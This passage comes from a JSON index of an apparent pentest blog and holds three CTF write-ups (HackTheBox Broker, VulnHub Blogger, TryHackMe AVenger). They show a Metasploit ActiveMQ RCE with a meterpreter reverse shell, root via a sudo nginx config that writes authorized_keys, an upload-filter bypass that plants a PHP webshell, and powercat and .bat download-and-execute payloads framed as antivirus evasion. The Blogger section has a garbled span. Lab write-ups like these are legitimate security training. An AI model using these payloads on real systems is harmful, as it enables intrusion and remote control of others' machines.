contain spaces. FETCH_SRVHOST no Local IP to use for serving payload FETCH_SRVPORT 8080 yes Local port to use for serving payload FETCH_URIPATH no Local URI to use for serving payload FETCH_WRITABLE_DIR %TEMP% yes Remote writable dir to store payload; cannot contain spaces. LHOST 10.0.2.77 yes The listen address (an interface may be specified) LPORT 4444 yes The listen portExploit target: Id Name -- ---- 0 WindowsView the full module info with the info, or info -d command.msf6 exploit(multi/misc/apache_activemq_rce_cve_2023_46604) > msf6 exploit(multi/misc/apache_activemq_rce_cve_2023_46604) > show targetsExploit targets:========== Id Name -- ----=> 0 Windows 1 Linux 2 Unixmsf6 exploit(multi/misc/apache_activemq_rce_cve_2023_46604) > set target 1target => 1msf6 exploit(multi/misc/apache_activemq_rce_cve_2023_46604) > set FETCH_WRITABLE_DIR /tmpFETCH_WRITABLE_DIR => /tmpmsf6 exploit(multi/misc/apache_activemq_rce_cve_2023_46604) > set LHOST tun0LHOST => 10.10.14.86msf6 exploit(multi/misc/apache_activemq_rce_cve_2023_46604) > set RHOSTS 10.10.11.243RHOSTS => 10.10.11.243msf6 exploit(multi/misc/apache_activemq_rce_cve_2023_46604) > set SRVPORT 9000SRVPORT => 8000msf6 exploit(multi/misc/apache_activemq_rce_cve_2023_46604) > set FETCH_SRVPORT 9001FETCH_SRVPORT => 8000msf6 exploit(multi/misc/apache_activemq_rce_cve_2023_46604) > set payload cmd/linux/http/x64/meterpreter/reverse_tcpmsf6 exploit(multi/misc/apache_activemq_rce_cve_2023_46604) > optionsModule options (exploit/multi/misc/apache_activemq_rce_cve_2023_46604): Name Current Setting Required Description ---- --------------- -------- ----------- CHOST no The local client address CPORT no The local client port Proxies no A proxy chain of format type:host:port[,type:host:port][...] RHOSTS 10.10.11.243 yes The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using -metasploit.html RPORT 61616 yes The target port (TCP) SRVHOST 0.0.0.0 yes The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses. SRVPORT 9000 yes The local port to listen on. SSLCert no Path to a custom SSL certificate (default is randomly generated) URIPATH no The URI to use for this exploit (default is random)Payload options (cmd/linux/http/x64/meterpreter/reverse_tcp): Name Current Setting Required Description ---- --------------- -------- ----------- EXITFUNC process yes Exit technique (Accepted: '', seh, thread, process, none) FETCH_COMMAND CERTUTIL yes Command to fetch payload (Accepted: CURL, TFTP, CERTUTIL) FETCH_DELETE false yes Attempt to delete the binary after execution FETCH_FILENAME czuIaEfmS no Name to use on remote system when storing payload; cannot contain spaces. FETCH_SRVHOST no Local IP to use for serving payload FETCH_SRVPORT 9001 yes Local port to use for serving payload FETCH_URIPATH no Local URI to use for serving payload FETCH_WRITABLE_DIR /tmp yes Remote writable dir to store payload; cannot contain spaces. LHOST 10.10.14.86 yes The listen address (an interface may be specified) LPORT 4444 yes The listen portExploit target: Id Name -- ---- 1 LinuxView the full module info with the info, or info -d command.msf6 exploit(multi/misc/apache_activemq_rce_cve_2023_46604) > run[*] Started reverse TCP handler on 10.10.14.86:4444 [*] 10.10.11.243:61616 - Running automatic check (\"set AutoCheck false\" to disable)[+] 10.10.11.243:61616 - The target appears to be vulnerable. Apache ActiveMQ 5.15.15[*] 10.10.11.243:61616 - Using URL: http://10.10.14.86:9000/JT6achMbwqF[*] 10.10.11.243:61616 - Sent ClassPathXmlApplicationContext configuration file.[*] 10.10.11.243:61616 - Sent ClassPathXmlApplicationContext configuration file.[*] Sending stage (3045380 bytes) to 10.10.11.243[*] Meterpreter session 1 opened (10.10.14.86:4444 -> 10.10.11.243:35206) at 2023-12-07 14:12:09 +0530[*] 10.10.11.243:61616 - Server stopped.meterpreter > getuidServer username: activemqmeterpreter > shellProcess 1408 created.Channel 1 created.python3 -c 'import pty;pty.spawn(\"/bin/bash\")'activemq@broker:/opt/apache-activemq-5.15.15/bin$ whoamiwhoamiactivemqactivemq@broker:/opt/apache-activemq-5.15.15/bin$ ididuid=1000(activemq) gid=1000(activemq) groups=1000(activemq)activemq@broker:/opt/apache-activemq-5.15.15/bin$ cd ~cd ~activemq@broker:~$ ls -alls -altotal 32drwxr-x--- 4 activemq activemq 4096 Nov 7 08:44 .drwxr-xr-x 3 root root 4096 Nov 6 01:18 ..lrwxrwxrwx 1 root root 9 Nov 5 04:14 .bash_history -> /dev/null-rw-r--r-- 1 activemq activemq 220 Nov 5 00:15 .bash_logout-rw-r--r-- 1 activemq activemq 3771 Nov 5 00:15 .bashrcdrwx------ 2 activemq activemq 4096 Nov 7 06:46 .cachedrwxrwxr-x 3 activemq activemq 4096 Nov 7 08:17 .local-rw-r--r-- 1 activemq activemq 807 Nov 5 00:15 .profile-rw-r----- 1 root activemq 33 Dec 7 05:12 user.txtactivemq@broker:~$ cat user.txtcat user.txt8b28b04cd22b96690da1f568923ad4a7activemq@broker:~$```{: .nolineno}Now I got the shell so lets dig deeper to get the root access â†’```bashactivemq@broker:~$ sudo -lsudo -lMatching Defaults entries for activemq on broker: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin, use_ptyUser activemq may run the following commands on broker: (ALL : ALL) NOPASSWD: /usr/sbin/nginxactivemq@broker:~$```{: .nolineno}I have to exploit the nginx service to gain access as root and for that I need to use the methedology of **[Zimbra](https://darrenmartynie.wordpress.com/2021/10/25/zimbra-nginx-local-root-exploit/)** exploit .> And with that similar method I am going to create another nginx configuration file and run it as root so that I will have some listening port open as nginx connection through root privileges and I will be able to access the listing of files as a root user through that port .{: .prompt-info }```bashactivemq@broker:~$ find / -name nginx.conf -type f 2>/dev/nullfind / -name nginx.conf -type f 2>/dev/null/etc/nginx/nginx.confactivemq@broker:~$ cp /etc/nginx/nginx.conf /dev/shm/nginx.confcp /etc/nginx/nginx.conf /dev/shm/nginx.confactivemq@broker:~$```{: .nolineno}Now I have another nginx.conf file that will be my working nginx configurations in it like this â†’```bashuser root;events {\tworker_connections 778;}http {\tserver {\t\tlisten 4444;\t\troot /;\t\tautoindex on;\t\tdav_methods PUT;\t}}```{: .nolineno}{: file='/dev/shm/nginx.conf'}- The first lineÂ **`user root;`**Â specifies the user that runs the Nginx worker processes.Â [In this case, it is the root user, which is not recommended for security reasons](https://www.digitalocean.com/community/tutorials/understanding-the-nginx-configuration-file-structure-and-configuration-contexts).- TheÂ **`events`**Â block contains settings that affect how Nginx handles connections from clients.Â [TheÂ **`worker_connections 778;`**Â directive sets the maximum number of simultaneous connections that each worker process can handle](https://www.nginx.com/resources/wiki/start/topics/examples/full/).- TheÂ **`http`**Â block contains settings that apply to the HTTP protocol, such as compression, caching, logging, etc.Â [It also contains one or moreÂ **`server`**Â blocks, which define virtual servers that listen for requests on specific ports and serve content based on the request URI](https://www.ionos.com/digitalguide/server/configuration/nginx-tutorial-getting-started-with-nginxconf/).- TheÂ **`server`**Â block in this file has the following directives: - **`[listen 4444;`**Â tells Nginx to listen for HTTP requests on port 4444](https://medium.com/adrixus/beginners-guide-to-nginx-configuration-files-527fcd6d5efd). - **`root /;`**Â sets the root directory for requests that do not match any other location.Â [In this case, it is the root of the file system, which is also not recommended for security reasons](https://127.0.0.1:8080/). - **`autoindex on;`**Â enables directory listing for requests that end with a slash. - **`dav_methods PUT;`**Â allows clients to upload files to the server using the HTTP PUT method.```bashactivemq@broker:~$ nano /dev/shm/nginx.confactivemq@broker:~$ cat /dev/shm/nginx.confuser root;events {\tworker_connections 778;}http {\tserver {\t\tlisten 4444;\t\troot /;\t\tautoindex on;\t\tdav_methods PUT;\t}}activemq@broker:~$ sudo nginx -c /dev/shm/nginx.conf activemq@broker:~$```{: .nolineno}Lets check the active network connections â†’![Untitled](Broker/Untitled%203.png)Now lets curl the root directory and see if we can getback the index of root directory â†’```bashactivemq@broker:~$ curl http://localhost:4444/Index of /Index of /../bin/ 06-Nov-2023 01:10 -boot/ 06-Nov-2023 01:38 -dev/ 05-Dec-2023 05:12 -etc/ 07-Nov-2023 06:53 -home/ 06-Nov-2023 01:18 -lib/ 06-Nov-2023 00:57 -lib32/ 17-Feb-2023 17:19 -lib64/ 05-Nov-2023 02:36 -libx32/ 17-Feb-2023 17:19 -lost+found/ 27-Apr-2023 15:40 -media/ 06-Nov-2023 01:18 -mnt/ 17-Feb-2023 17:19 -opt/ 06-Nov-2023 01:18 -proc/ 05-Dec-2023 05:12 -root/ 07-Nov-2023 08:40 -run/ 05-Dec-2023 15:49 -sbin/ 06-Nov-2023 01:10 -srv/ 06-Nov-2023 01:18 -sys/ 05-Dec-2023 05:12 -tmp/ 05-Dec-2023 16:40 -usr/ 17-Feb-2023 17:19 -var/ 05-Nov-2023 01:43 -activemq@broker:~$```{: .nolineno}I can list all the root directories through curl command , But for the shell access I have to include some files in root directory so that I can have too accessed shell â†’So here , I need to create the ssh keys for user active and include its public key into the authorized_keys of root directory â†’```bashactivemq@broker:~$ ssh-keygenGenerating public/private rsa key pair.Enter file in which to save the key (/home/activemq/.ssh/id_rsa): Created directory '/home/activemq/.ssh'.Enter passphrase (empty for no passphrase): Enter same passphrase again: Your identification has been saved in /home/activemq/.ssh/id_rsaYour public key has been saved in /home/activemq/.ssh/id_rsa.pubThe key fingerprint is:SHA256:TJRFkyyDmwnJ09Lqo/SOhi3DVl3G4C/aHrRcH/xys5A activemq@brokerThe key israndomart image is:+---[RSA 3072]----+| . + ..=+. || *.+.+ o. || .=o+.o || ..+*. || ...+.So || ..=oo.. + ||.+.oo=. E + ||+o+o... + o ||.+..o. . |+----[SHA256]-----+activemq@broker:~$ cat .ssh/id_rsa.pub ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC6MyuBf04hSwdaOAuqjPI927NJd5GpSSE0zviwqLKynkZynHnEq2mg5DKzg3wTJEEG+Wci1+KG6k5dWb8QMb+sTFmsDkriGAhKyBSRz8avSrpKaFZEkUELhQm4FeU6ai2fZRFsk0k41OglwySCCYDLjf9M55WrYzwzqb0nO+gpR41QEQ6r7JwjmFAlZ360BM697bm4n0wERK6AunVpA30PZWV4fSiIZTu2aUBvD6fSu7GpJjyQSW10xhzwoZ4rJiCnw49oeKjswm2l5/lhc35cskt9+jJFc0mnLyy5aKxAcV2oyhtYUJEuSkZY+JIvURvzbvjdAZVadbJ11YUO4KZLqlJbKdTSpUkFydGNzm97Rjw+Lw+gUcaeSnozXkWAB/uSdGIeY9Q2d2SNrcW98WQr8HFcPNxziyD+RmWuFyG7O9mcpg3p9fu6+Yb80NoeUijpVXbEtgKoQw7HlOPByz4MG5nCLBqwGzm5rAZAnkbNOzAcuUOyyhyPx7fPhpoFHoU= activemq@brokeractivemq@broker:~$```{: .nolineno}Now lets include this public key into the root directory of authorized_keys â†’```bashactivemq@broker:~$ curl -X PUT localhost:4444/root/.ssh/authorized_keys -d 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDH8CvbWjICUQPx9sPrrAEKKfKzknXl4HouC2C0K3eSn/iSWrHBjyP9M9hZzNu80yvnjPcPwIbiPF7yrKzjuBgzEjUGxsgwkKaSG6sFiFPW/KIKDUTMCV6NeV0d9KvxQSlaXmDKQ2HNBKklegKzaQZVGh1kf4rz+dvkezN9hKFgz7gCDGOfiPPwJYpnd7fKRhmT48/B19rQenOxhduc5avIpJbe9CrV0waa3jjy54Fjeqcd4xg5MFSDvT9IlcNYtTOS0rMYVfnJHaJJW8W0E+v6XyjCmWzOangeiERCP5o3CKFN7WzFcfgXC7yt0CK4HuOHFhVu+yxfD0KpZitzqvjAP7ZA/lYj8O74uPsRUvWQM8M1vpelERuekAoQo4iFnZ2UzuTUCkPA9Yujn+It5LiKpGFy/dGl95cIr2Os7smF4L/a7M2wbKHGutqe/RQDKdD49QyJ0DabTx+QzyjeC5IhOTdDgBY1HpnZ/HuUgRpUMSkfRDuEc4GLGmCY5i/Suo0= activemq@broker'```{: .nolineno}Letâ€™s check through login it as root user â†’```bashactivemq@broker:~$ chmod 600 ~/.ssh/id_rsaactivemq@broker:~$ ssh -i ~/.ssh/id_rsa root@localhostThe authenticity of host 'localhost (127.0.0.1)' can not be established.ED25519 key fingerprint is SHA256:TgNhCKF6jUX7MG8TC01/MUj/+u0EBasUVsdSQMHdyfY.This key is not known by any other namesAre you sure you want to continue connecting (yes/no/[fingerprint])? yesWarning: Permanently added 'localhost' (ED25519) to the list of known hosts.Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-88-generic x86_64)......root@broker:~# whoamirootroot@broker:~# iduid=0(root) gid=0(root) groups=0(root)root@broker:~# cd /rootroot@broker:~# ls -altotal 36drwx------ 5 root root 4096 Nov 7 08:40 .drwxr-xr-x 18 root root 4096 Nov 6 01:18 ..lrwxrwxrwx 1 root root 9 Apr 27 2023 .bash_history -> /dev/null-rw-r--r-- 1 root root 3106 Oct 15 2021 .bashrcdrwx------ 2 root root 4096 Apr 27 2023 .cache-rwxr-xr-x 1 root root 517 Nov 7 08:15 cleanup.shdrwxr-xr-x 3 root root 4096 Apr 27 2023 .local-rw-r--r-- 1 root root 161 Jul 9 2019 .profile-rw-r----- 1 root root 33 Dec 7 09:29 root.txtdrwx------ 2 root root 4096 Dec 7 09:38 .sshroot@broker:~# cat root.txt1d19bc37b08665582e06c84e83e69aacroot@broker:~# ip a1: lo: mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000 link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00 inet 127.0.0.1/8 scope host lo valid_lft forever preferred_lft forever inet6 ::1/128 scope host valid_lft forever preferred_lft forever2: eth0: mtu 1500 qdisc mq state UP group default qlen 1000 link/ether 00:50:56:b9:bd:5d brd ff:ff:ff:ff:ff:ff altname enp3s0 altname ens160 inet 10.10.11.243/23 brd 10.10.11.255 scope global eth0 valid_lft forever preferred_lft forever inet6 dead:beef::250:56ff:feb9:bd5d/64 scope global dynamic mngtmpaddr valid_lft 86395sec preferred_lft 14395sec inet6 fe80::250:56ff:feb9:bd5d/64 scope link valid_lft forever preferred_lft foreverroot@broker:~# hostnamebrokerroot@broker:~#```{: .nolineno}I am root now !!> If you have any questions or suggestions, please leave a comment below.Thank You ! {: .prompt-tip }" }, { "title": "Blogger", "url": "/posts/Blogger/", "categories": "VulnHub", "tags": "File Upload, Hid&Trial, PrivEsc, Wordpress", "date": "2023-12-10 00:00:00 +0530", "snippet": "> VulnHub Easy Machine [blogger: 1](https://www.vulnhub.com/entry/blogger-1,675/){: .prompt-tip }## Port Scan Results â¤µï¸```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/Vulnhub/Blogger]â””â”€$ sudo nmap -sC -sV -p- ...", "content": "> VulnHub Easy Machine [blogger: 1](https://www.vulnhub.com/entry/blogger-1,675/){: .prompt-tip }## Port Scan Results â¤µï¸```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/Vulnhub/Blogger]â””â”€$ sudo nmap -sC -sV -p- -T4 -oN Nmap_Result.txt 10.0.2.15Starting Nmap 7.94SVN ( https://nmap.org ) at 2023-12-03 21:01 ISTNmap scan report for 10.0.2.15Host is up (0.00078s latency).Not shown: 65533 closed tcp ports (reset)PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 2048 95:1d:82:8f:5e:de:9a:00:a8:07:39:bd:ac:ad:d3:44 (RSA)| 256 d7:b4:52:a2:c8:fa:b7:0e:d1:a8:d0:70:cd:6b:36:90 (ECDSA)|_ 256 df:f2:4f:77:33:44:d5:93:d7:79:17:45:5a:a1:36:8b (ED25519)80/tcp open http Apache httpd 2.4.18 ((Ubuntu))|_http-title: Blogger | Home|_http-server-header: Apache/2.4.18 (Ubuntu)MAC Address: 02:1C:00:A5:06:70 (Unknown)Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed.```{: .nolineno}{: file='Nmap_Result.txt'}## Web Enumeration â¤µï¸I enumerated port 80 first â†’![Untitled](Blogger/Untitled%201.png)Then through directory or files bruteforcing with feroxbuster Tool I got some directories like `/assets` and I got some indexed files â†’![Untitled](Blogger/Untitled%202.png)After going into blog directory I got redirected to a `wordpress` site where I got the domain name too as `blogger.thm` â†’![Untitled](Blogger/Untitled%203.png)On clicking a blog post and scrolling down I got a comment system where I can upload an image file â†’![Untitled](Blogger/Untitled%204.png)Now I tried to get the reverse shell through upload an image file but that image file will be my payload which is generated like this â†’### **Editing Hex Bytes to Bypass Image Filers â¤µï¸**Other filters look at the â€˜Magic Numberâ€™ at the beginning of a file to determine if it is a valid image. The table below shows you the â€˜Magic Numberâ€™ for various image types:> BMP : 42 4D> > > JPG :Â  Â FF D8 FF E0> > PNG :Â  89 50 4E 47> > GIF :Â  Â 47 49 46 38{: .prompt-info }From this point, we can use the linux tool â€˜hexeditorâ€™ to change the beginning bytes of our php script to insert new bytes:`hexeditor -b test.php`You should see the following:![https://gobiasinfosec.files.wordpress.com/2019/12/test1.png?w=656](https://gobiasinfosec.files.wordpress.com/2019/12/test1.png?w=656)To add new bytes, press Ctrl+A for each byte you need to add.![https://gobiasinfosec.files.wordpress.com/2019/12/test2.png?w=656](https://gobiasinfosec.files.wordpress.com/2019/12/test2.png?w=656)Now insert the â€˜Magic Numberâ€™ for the file type youâ€™re aiming for. In this example, weâ€™ll make it .jpg![https://gobiasinfosec.files.wordpress.com/2019/12/test3.png?w=656](https://gobiasinfosec.files.wordpress.com/2019/12/test3.png?w=656)Finally save the file as `test.jpg`![https://gobiasinfosec.files.wordpress.com/2019/12/test4.png?w=656](https://gobiasinfosec.files.wordpress.com/2019/12/test4.png?w=656)Now at this point weâ€™ll use a different injection technique than we used above, but know that any combination of these techniques may be needed to bypass upload filtering to getting a working executable.I have to upload this file my file name is `RFI.php.jpg` now â†’![Untitled](Blogger/Untitled%205.png)Now I have to click on `POST COMMENT` to make it register as a comment â†’![Untitled](Blogger/Untitled%206.png)After Forwording the request I got my File â†’![Untitled](Blogger/Untitled%207.png)I loaded the file on new tab and executed the cmd parameter command â†’![Untitled](Blogger/Untitled%208.png)I got it `Remote File Inclusion (RFI)` from there lets have a reverse shell and for that I used python3 reverse shell command and executed to after changing the IP address and port â†’```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/Vulnhub/Blogger]â””â”€$ nc -lvnp 4444 listening on [any] 4444 ...connect to [10.0.2.77] from (UNKNOWN) [10.0.2.15] 39218/bin/sh: 0: can not access tty; job control turned off$ python3 -c 'import pty;pty.spawn(\"/bin/bash\")''v$)='2a#B&>`c'=+C(?5(|)q**bAv2=+E5s'+|u&I'vDI(uAt&=+(|`yx')Av#>'v%?}:#=+)';y@%'5(2vA!' mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1 link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00 inet 127.0.0.1/8 scope host lo valid_lft forever preferred_lft forever inet6 ::1/128 scope host valid_lft forever preferred_lft forever2: enp0s3: mtu 1500 qdisc pfifo_fast state UP group default qlen 1000 link/ether 02:1c:00:a5:06:70 brd ff:ff:ff:ff:ff:ff inet 10.0.2.15/24 brd 10.0.2.255 scope global enp0s3 valid_lft forever preferred_lft forever inet6 fe80::1c:ff:fea5:670/64 scope link valid_lft forever preferred_lft forever3: enp0s8: mtu 1500 qdisc pfifo_fast state UP group default qlen 1000 link/ether 08:00:27:fb:20:dc brd ff:ff:ff:ff:ff:ff inet 192.168.55.10/24 brd 192.168.55.255 scope global enp0s8 valid_lft forever preferred_lft forever inet6 fe80::a00:27ff:fefb:20dc/64 scope link valid_lft forever preferred_lft foreverroot@ubuntu-xenial:/root# hostnameubuntu-xenialroot@ubuntu-xenial:/root# whoamirootroot@ubuntu-xenial:/root# iduid=0(root) gid=0(root) groups=0(root)root@ubuntu-xenial:/root#```{: .nolineno}I am root now !!> If you have any questions or suggestions, please leave a comment below.Thank You ! {: .prompt-tip }" }, { "title": "AVenger", "url": "/posts/Avenger/", "categories": "TryHackMe", "tags": "Antivirus Evasion, Public Exploit, UAC, Wordpress, Windows", "date": "2023-12-10 00:00:00 +0530", "snippet": "> [TryHackMe AVenger](https://tryhackme.com/room/avenger){: .prompt-tip }## Port Scan Results â¤µï¸```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/Tryhackme/Avenger]â””â”€$ sudo nmap -sC -sV -p- -T4 -oN Nmap_Result.tx...", "content": "> [TryHackMe AVenger](https://tryhackme.com/room/avenger){: .prompt-tip }## Port Scan Results â¤µï¸```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/Tryhackme/Avenger]â””â”€$ sudo nmap -sC -sV -p- -T4 -oN Nmap_Result.txt 10.10.159.75 [sudo] password for kali: Starting Nmap 7.94SVN ( https://nmap.org ) at 2023-11-30 15:32 ISTNmap scan report for 10.10.159.75Host is up (0.17s latency).Not shown: 65518 closed tcp ports (reset)PORT STATE SERVICE VERSION80/tcp open http Apache httpd 2.4.56 (OpenSSL/1.1.1t PHP/8.0.28)| http-methods: |_ Potentially risky methods: TRACE|_http-server-header: Apache/2.4.56 (Win64) OpenSSL/1.1.1t PHP/8.0.28| http-ls: Volume /| SIZE TIME FILENAME| 3.5K 2022-06-15 16:07 applications.html| 177 2022-06-15 16:07 bitnami.css| - 2023-04-06 09:24 dashboard/| 30K 2015-07-16 15:32 favicon.ico| - 2023-06-27 09:26 gift/| - 2023-06-27 09:04 img/| 751 2022-06-15 16:07 img/module_table_bottom.png| 337 2022-06-15 16:07 img/module_table_top.png| - 2023-06-28 14:39 xampp/|_|_http-title: Index of /135/tcp open msrpc Microsoft Windows RPC139/tcp open netbios-ssn Microsoft Windows netbios-ssn443/tcp open ssl/http Apache httpd 2.4.56 (OpenSSL/1.1.1t PHP/8.0.28)|_http-server-header: Apache/2.4.56 (Win64) OpenSSL/1.1.1t PHP/8.0.28| ssl-cert: Subject: commonName=localhost| Not valid before: 2009-11-10T23:48:47|_Not valid after: 2019-11-08T23:48:47|_ssl-date: TLS randomness does not represent time|_http-title: Index of /| http-ls: Volume /| SIZE TIME FILENAME| 3.5K 2022-06-15 16:07 applications.html| 177 2022-06-15 16:07 bitnami.css| - 2023-04-06 09:24 dashboard/| 30K 2015-07-16 15:32 favicon.ico| - 2023-06-27 09:26 gift/| - 2023-06-27 09:04 img/| 751 2022-06-15 16:07 img/module_table_bottom.png| 337 2022-06-15 16:07 img/module_table_top.png| - 2023-06-28 14:39 xampp/|_| tls-alpn: |_ http/1.1| http-methods: |_ Potentially risky methods: TRACE445/tcp open microsoft-ds?3306/tcp open mysql MySQL 5.5.5-10.4.28-MariaDB| mysql-info: | Protocol: 10| Version: 5.5.5-10.4.28-MariaDB| Thread ID: 11| Capabilities flags: 63486| Some Capabilities: Support41Auth, ConnectWithDatabase, Speaks41ProtocolOld, DontAllowDatabaseTableColumn, SupportsTransactions, IgnoreSigpipes, InteractiveClient, IgnoreSpaceBeforeParenthesis, Speaks41ProtocolNew, ODBCClient, FoundRows, SupportsLoadDataLocal, SupportsCompression, LongColumnFlag, SupportsMultipleResults, SupportsMultipleStatments, SupportsAuthPlugins| Status: Autocommit| Salt: D6!@_=TmH^!(Eb?PV?uQ|_ Auth Plugin Name: mysql_native_password3389/tcp open ms-wbt-server Microsoft Terminal Services| rdp-ntlm-info: | Target_Name: GIFT| NetBIOS_Domain_Name: GIFT| NetBIOS_Computer_Name: GIFT| DNS_Domain_Name: gift| DNS_Computer_Name: gift| Product_Version: 10.0.17763|_ System_Time: 2023-11-30T10:10:36+00:00|_ssl-date: 2023-11-30T10:10:46+00:00; 0s from scanner time.| ssl-cert: Subject: commonName=gift| Not valid before: 2023-11-29T09:59:54|_Not valid after: 2024-05-30T09:59:545985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)|_http-server-header: Microsoft-HTTPAPI/2.0|_http-title: Not Found47001/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)|_http-server-header: Microsoft-HTTPAPI/2.0|_http-title: Not Found49664/tcp open msrpc Microsoft Windows RPC49665/tcp open msrpc Microsoft Windows RPC49666/tcp open msrpc Microsoft Windows RPC49667/tcp open msrpc Microsoft Windows RPC49668/tcp open msrpc Microsoft Windows RPC49669/tcp open msrpc Microsoft Windows RPC49670/tcp open msrpc Microsoft Windows RPC49677/tcp open msrpc Microsoft Windows RPCService Info: Hosts: localhost, www.example.com; OS: Windows; CPE: cpe:/o:microsoft:windowsHost script results:| smb2-time: | date: 2023-11-30T10:10:41|_ start_date: N/A| smb2-security-mode: | 3:1:1: |_ Message signing enabled but not requiredService detection performed.```{: .nolineno}{: file='Nmap_Result.txt'}## Web Enumeration â¤µï¸Lets check port 80 and 443 first and in both ports I got the same results â†’![Untitled](Avenger/Untitled.png)I then clicked on `gift` and then I got a domain name for it as `avenger.tryhackme` , then I set the host name as it is and loaded the site I got this â†’![Untitled](Avenger/Untitled%201.png)After scrolling down and while enumeration process I encountered with a form that will upload a file with some dataâ€™s so I tried to upload some file but noluck that time. ![Untitled](Avenger/Untitled%202.png)I moved on and checked the source code and got to know that this site is a CMS of wordpress so I used the Tool wpscan That will enumerate Plugins , Themes , and Users in that site â†’![Untitled](Avenger/Untitled%203.png) wpscan Tool results â†’![Untitled](Avenger/Untitled%204.png)I got some vulnerable plugins running on this victim machine â†’```bash[i] Plugin(s) Identified:[+] forminator | Location: http://avenger.tryhackme/gift/wp-content/plugins/forminator/ | Last Updated: 2023-11-13T09:11:00.000Z | [!] The version is out of date, the latest version is 1.28.0 | | Found By: Urls In Homepage (Passive Detection) | | Version: 1.24.1 (100% confidence) | Found By: Readme - Stable Tag (Aggressive Detection) | - http://avenger.tryhackme/gift/wp-content/plugins/forminator/readme.txt | Confirmed By: Readme - ChangeLog Section (Aggressive Detection) | - http://avenger.tryhackme/gift/wp-content/plugins/forminator/readme.txt[+] ultimate-addons-for-gutenberg | Location: http://avenger.tryhackme/gift/wp-content/plugins/ultimate-addons-for-gutenberg/ | Last Updated: 2023-11-11T09:21:00.000Z | [!] The version is out of date, the latest version is 2.10.1 | | Found By: Urls In Homepage (Passive Detection) | | Version: 2.6.9 (100% confidence) | Found By: Readme - Stable Tag (Aggressive Detection) | - http://avenger.tryhackme/gift/wp-content/plugins/ultimate-addons-for-gutenberg/readme.txt | Confirmed By: Readme - ChangeLog Section (Aggressive Detection) | - http://avenger.tryhackme/gift/wp-content/plugins/ultimate-addons-for-gutenberg/readme.txt```{: .nolineno}{: file='Wpscan Plugins'}I checked the exploit related to forminator version 1.24.1 and I got this exploit â†’**[WordPress Plugin Forminator 1.24.6 - Unauthenticated Remote Command Execution](https://www.exploit-db.com/exploits/51664)**I used it on that form that I got earlier through burpsuite I uploaded some file but no response so I created a html file that will load the local server and Lets see if the victim machine callbacks that file or not â†’```html```{: .nolineno}![Untitled](Avenger/Untitled%205.png)As I noticed that the file after uploading , it gets callback from the system so I have to create a reverse shell script and upload it so that it get callback and I can get the shell .> But I also have to take care of Antivirus that is activated on the system , so for evading it . I used a `powercat` payload and encoded in its `Hexadecimal Array` that can help me to evade the Antivirus detection.{: .prompt-tip }```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/Tryhackme/Avenger]â””â”€$ LHOST=10.8.83.156 LPORT=443 rshell=shell-443.txt pwsh -c \"iex (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1');powercat -c $LHOST -p $LPORT -e cmd.exe -ge\" > ~/Downloads/Tryhackme/Avenger/$rshell```{: .nolineno}{: file='shell-433.txt'}Now I have to create another batch file (.bat) that will download this payload `shell-443.txt` and execute it as powershell â†’```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/Tryhackme/Avenger]â””â”€$ echo \"START /B powershell -c \\$code=(New-Object System.Net.Webclient).DownloadString('http://10.8.83.156:80/shell-443.txt');iex 'powershell -E \\$code'\" > ~/Downloads/Tryhackme/Avenger/shell.bat```{: .nolineno}{: file='shell.bat'}Lets upload this shell.bat file that will give me a shell on port 443 so I have to start my nc listener on port 443 â†’![Untitled](Avenger/Untitled%206.png)My file then gets a callback from the victim machine â†’![Untitled](Avenger/Untitled%207.png)And with that I also got my reverse shell â†’```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/Tryhackme/Avenger]â””â”€$ nc -lvnp 443 listening on [any] 443 ...connect to [10.8.83.156] from (UNKNOWN) [10.10.124.144] 49800Microsoft Windows [Version 10.0.17763.4499](c) 2018 Microsoft Corporation. All rights reserved.C:\\Windows\\system32>whoamiwhoamigift\\hugoC:\\Windows\\system32>hostnamehostnamegiftC:\\Windows\\system32>```{: .nolineno}I tried to download the winpeas but canâ€™t able to execute it because each time Antivirus detects it and then removed that file so I tried **PrivescCheck.ps1** file with powershell bypass command and it worked â†’```bashPS C:\\Users\\hugo\\Documents> wget -usebasicparsing http://10.8.83.156:8000/PrivescCheck.ps1 -o PrivescCheck.ps1wget -usebasicparsing http://10.8.83.156:8000/PrivescCheck.ps1 -o PrivescCheck.ps1PS C:\\Users\\hugo\\Documents>```{: .nolineno}Now I used this powershell bypass command to make it run â†’```bashPS C:\\Users\\hugo\\Documents> powershell -ep bypass -c \". .\\PrivescCheck.ps1; Invoke-PrivescCheck\"powershell -ep bypass -c \". .\\PrivescCheck.ps1; Invoke-PrivescCheck\"????????????????????????????????????????????????????????????????? CATEGORY ? TA0043 - Reconnaissance ?? NAME ? User identity ?????????????????????????????????????????????????????????????????? Get information about the current user (name, domain name) ?? and its access token (SID, integrity level, authentication ?? ID). ?????????????????????????????????????????????????????????????????[*] Status: InformationalName : GIFT\\hugoSID : S-1-5-21-1966530601-3185510712-10604624-1008IntegrityLevel : Medium Mandatory Level 